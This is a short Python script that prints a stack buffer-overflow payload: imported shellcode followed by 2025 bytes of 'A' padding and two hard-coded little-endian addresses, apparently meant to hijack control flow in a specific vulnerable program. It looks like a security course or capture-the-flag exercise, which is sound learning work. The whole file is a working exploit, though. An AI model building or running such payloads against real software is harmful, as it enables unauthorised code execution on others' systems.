from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(shellcode + b"\x41"*2025 + pack("<I",0xFFFEF3D8) + pack("<I",0xFFFEFBEC))
